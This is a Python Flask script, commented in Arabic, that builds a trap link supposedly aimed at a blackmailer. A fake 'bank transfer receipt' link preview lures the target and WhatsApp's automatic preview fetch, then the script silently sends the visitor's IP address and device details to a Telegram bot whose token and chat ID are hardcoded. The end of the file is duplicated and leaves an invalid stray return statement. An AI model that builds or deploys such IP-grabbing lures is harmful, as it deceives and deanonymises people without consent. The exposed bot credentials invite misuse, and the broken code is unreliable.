import os
from flask import Flask, request, send_file, render_template_string
import telebot
import io

TOKEN = "8444429563:AAEZL3LwcSp50Bx_CgL46g5KnXmC8NjAtxw"
CHAT_ID = "5775781038"
bot = telebot.TeleBot(TOKEN)
app = Flask(__name__)

def get_victim_ip():
    if request.headers.get('X-Forwarded-For'):
        return request.headers.get('X-Forwarded-For').split(',')[0].strip()
    return request.remote_addr

# صفحة الفخ التي تظهر للمبتز وتجبر الواتساب على سحب المعاينة
@app.route('/view_photo')
def index():
    ip = get_victim_ip()
    ua = request.headers.get('User-Agent', 'Unknown')
    bot.send_message(CHAT_ID, f"🎯 **دخل المبتز للرابط!**\n🌐 IP: `{ip}`\n📱 Sys: `{ua[:100]}`")
    
    # هذا الكود يخدع واتساب ليظهر صورة معاينة جذابة
    return render_template_string('''
    <html><head>
    <title>تحميل الملف...</title>
    <meta property="og:title" content="إيصال تحويل بنكي - ملف آمن">
    <meta property="og:description" content="انقر لمشاهدة تفاصيل التحويل">
    <meta property="og:image" content="https://cdn-icons-png.flaticon.com/512/4726/4726001.png">
    <meta property="og:type" content="article">
    <script>window.location.href="https://google.com";</script>
    </head><body style="background:black;"></body></html>
    ''')

@app.route('/image.jpg')
def trap():
    ip = get_victim_ip()
    bot.send_message(CHAT_ID, f"📸 **معاينة تلقائية من جهازه!**\n🌐 IP: `{ip}`")
    img = b'\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR\x00\x00\x00\x01\x00\x00\x00\x01\x08\x06\x00\x00\x00\x1f\x15\xc4\x89\x00\x00\x00\nIDATx\x9cc\x00\x01\x00\x00\x05\x00\x01\r\n\x2d\xb4\x00\x00\x00\x00IEND\xaeB`\x82'
    return send_file(io.BytesIO(img), mimetype='image/jpeg')

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)
    return send_file(io.BytesIO(img), mimetype='image/jpeg')

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)
